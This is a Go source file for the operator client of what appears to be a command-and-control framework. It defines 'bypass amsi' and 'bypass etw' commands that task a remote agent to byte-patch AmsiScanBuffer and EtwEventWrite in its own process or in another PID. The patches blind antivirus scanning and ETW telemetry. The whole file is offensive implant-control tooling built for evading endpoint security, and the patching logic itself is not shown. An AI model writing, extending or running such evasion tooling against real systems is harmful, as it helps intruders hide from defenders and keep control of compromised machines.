package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"

	"github.com/spf13/cobra"
)

var bypassCmd = &cobra.Command{
	Use:   "bypass",
	Short: "EDR/AV bypass techniques (Phase 3)",
}

// bypass amsi <agent-id> [--pid <pid>]
var bypassAMSICmd = &cobra.Command{
	Use:   "amsi <agent-id>",
	Short: "Patch AmsiScanBuffer to disable AMSI",
	Long: `Byte-patch AmsiScanBuffer in the agent process (or a remote PID) so that
all AMSI scans return AMSI_RESULT_CLEAN. Effective for the lifetime of the process.

Examples:
  bypass amsi 7d019eb7               # patch agent's own process
  bypass amsi 7d019eb7 --pid 1234    # patch AMSI in a remote PID
  bypass amsi 7d019eb7 --wait`,
	Args: cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		pid, _ := cmd.Flags().GetUint32("pid")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		payload, _ := json.Marshal(map[string]interface{}{"pid": pid})
		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/bypass/amsi",
			bytes.NewBuffer(payload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("AMSI bypass failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			msg := "unknown error"
			if resp.Error != "" {
				msg = resp.Error
			}
			printError(fmt.Sprintf("AMSI bypass failed: %s", msg))
			os.Exit(1)
		}

		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)
		target, _ := dataMap["target"].(string)
		printSuccess(fmt.Sprintf("AMSI bypass queued → %s", target))

		if wait && cmdID != "" {
			printInfo(fmt.Sprintf("Waiting for result (timeout %ds)...", timeout))
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		} else if cmdID != "" {
			printInfo(fmt.Sprintf("command_id: %s", cmdID))
		}
	},
}

// bypass etw <agent-id> [--pid <pid>]
var bypassETWCmd = &cobra.Command{
	Use:   "etw <agent-id>",
	Short: "Patch EtwEventWrite to suppress ETW telemetry",
	Long: `Byte-patch EtwEventWrite in ntdll.dll inside the agent process (or a remote PID)
so all ETW events are silently dropped. Reduces visibility in tools monitoring ETW providers.

Examples:
  bypass etw 7d019eb7               # patch agent's own process
  bypass etw 7d019eb7 --pid 5678    # patch ETW in a specific PID
  bypass etw 7d019eb7 --wait`,
	Args: cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		pid, _ := cmd.Flags().GetUint32("pid")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		payload, _ := json.Marshal(map[string]interface{}{"pid": pid})
		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/bypass/etw",
			bytes.NewBuffer(payload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("ETW bypass failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			msg := "unknown error"
			if resp.Error != "" {
				msg = resp.Error
			}
			printError(fmt.Sprintf("ETW bypass failed: %s", msg))
			os.Exit(1)
		}

		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)
		target, _ := dataMap["target"].(string)
		printSuccess(fmt.Sprintf("ETW bypass queued → %s", target))

		if wait && cmdID != "" {
			printInfo(fmt.Sprintf("Waiting for result (timeout %ds)...", timeout))
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		} else if cmdID != "" {
			printInfo(fmt.Sprintf("command_id: %s", cmdID))
		}
	},
}
